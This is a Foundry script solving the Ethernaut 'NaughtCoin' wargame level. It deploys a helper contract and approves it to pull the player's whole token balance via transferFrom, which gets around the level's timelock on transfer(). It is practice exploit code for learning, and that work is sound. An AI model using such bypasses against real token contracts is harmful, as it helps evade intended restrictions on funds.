// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/NaughtCoin.sol";

contract Receiver {
    NaughtCoin public coin = NaughtCoin(0xe29B1342f9e85FE0372eF25bE76d942e33B6c0D5);
    constructor() {}

    function transferTokens(address _from, uint256 _amount) external {
        coin.transferFrom(_from, address(this), _amount);
    }
}

/// @author agadzhalov
/// @title Solution to NaughtCoin Ethernaut challenge
/// @notice Solution: 
///         By ERC20 standard, the owner of the tokens can approve as many tokens as they hold to another account.
///         When the other account has approval, it can spend tokens on behalf of the owner.
contract NaughtCoinScript is Script {

    NaughtCoin public coin = NaughtCoin(0xe29B1342f9e85FE0372eF25bE76d942e33B6c0D5);
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Retrieve the token balance of the specified wallet
        uint256 tokenAmount = coin.balanceOf(vm.envAddress("WALLLET_ADDRESS"));
        console.log("1. Initial balance", tokenAmount);
        
        // Deploy the Receiver contract
        Receiver receiver = new Receiver();
        
        // Approve the Receiver contract to transfer the tokens
        coin.approve(address(receiver), tokenAmount);
        
        // Execute token transfer from the specified wallet to the Receiver contract
        receiver.transferTokens(vm.envAddress("WALLLET_ADDRESS"), tokenAmount);
        
        // Log the final token balance after the transfer
        console.log("2. Balance after", coin.balanceOf(vm.envAddress("WALLLET_ADDRESS")));
        
        vm.stopBroadcast();

    }
}
